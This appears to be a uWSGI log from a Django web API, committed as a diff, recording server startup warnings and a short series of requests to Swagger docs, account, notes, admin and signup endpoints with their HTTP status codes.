+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56456508f320 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 9, cores: 2)
+Not Found: /
+[pid: 9|app: 0|req: 1/1] 220.123.151.127 () {46 vars in 1216 bytes} [Wed Mar 24 08:33:48 2021] GET / => generated 2797 bytes in 353 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 2/2] 220.123.151.127 () {42 vars in 1166 bytes} [Wed Mar 24 08:33:53 2021] GET /swagger/ => generated 2218 bytes in 22 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 3/3] 220.123.151.127 () {44 vars in 1178 bytes} [Wed Mar 24 08:33:53 2021] GET /swagger/?format=openapi => generated 4720 bytes in 12 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 4/4] 23.22.16.221 () {36 vars in 482 bytes} [Wed Mar 24 08:33:54 2021] GET /swagger/?format=openapi => generated 4720 bytes in 11 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 5/5] 220.123.151.127 () {42 vars in 1166 bytes} [Wed Mar 24 08:34:00 2021] GET /swagger/ => generated 2218 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 6/6] 220.123.151.127 () {44 vars in 1178 bytes} [Wed Mar 24 08:34:00 2021] GET /swagger/?format=openapi => generated 4720 bytes in 11 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 7/7] 23.22.16.221 () {36 vars in 482 bytes} [Wed Mar 24 08:34:01 2021] GET /swagger/?format=openapi => generated 4720 bytes in 11 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+Unauthorized: /accounts/child/
+[pid: 9|app: 0|req: 8/8] 220.123.151.127 () {44 vars in 1159 bytes} [Wed Mar 24 08:34:54 2021] GET /accounts/child/ => generated 58 bytes in 2 msecs (HTTP/1.1 401) 8 headers in 251 bytes (1 switches on core 1)
+Unauthorized: /notes/
+[pid: 9|app: 0|req: 9/9] 220.123.151.127 () {44 vars in 1141 bytes} [Wed Mar 24 08:35:05 2021] GET /notes/ => generated 58 bytes in 1 msecs (HTTP/1.1 401) 8 headers in 245 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 10/10] 220.123.151.127 () {42 vars in 1162 bytes} [Wed Mar 24 08:35:21 2021] GET /admin/ => generated 0 bytes in 5 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 11/11] 220.123.151.127 () {42 vars in 1199 bytes} [Wed Mar 24 08:35:21 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 22 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+Not Found: /accounts
+[pid: 9|app: 0|req: 12/12] 220.123.151.127 () {42 vars in 1166 bytes} [Wed Mar 24 08:35:29 2021] GET /accounts => generated 2839 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /accounts/
+[pid: 9|app: 0|req: 13/13] 220.123.151.127 () {42 vars in 1168 bytes} [Wed Mar 24 08:35:33 2021] GET /accounts/ => generated 4463 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/signup/
+[pid: 9|app: 0|req: 14/14] 220.123.151.127 () {42 vars in 1182 bytes} [Wed Mar 24 08:35:46 2021] GET /accounts/signup/ => generated 5602 bytes in 17 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 15/15] 220.123.151.127 () {48 vars in 1289 bytes} [Wed Mar 24 08:35:59 2021] OPTIONS /accounts/signup/ => generated 5868 bytes in 16 msecs (HTTP/1.1 200) 8 headers in 387 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/signup/
+[pid: 9|app: 0|req: 16/16] 220.123.151.127 () {44 vars in 1239 bytes} [Wed Mar 24 08:36:03 2021] GET /accounts/signup/ => generated 5602 bytes in 16 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
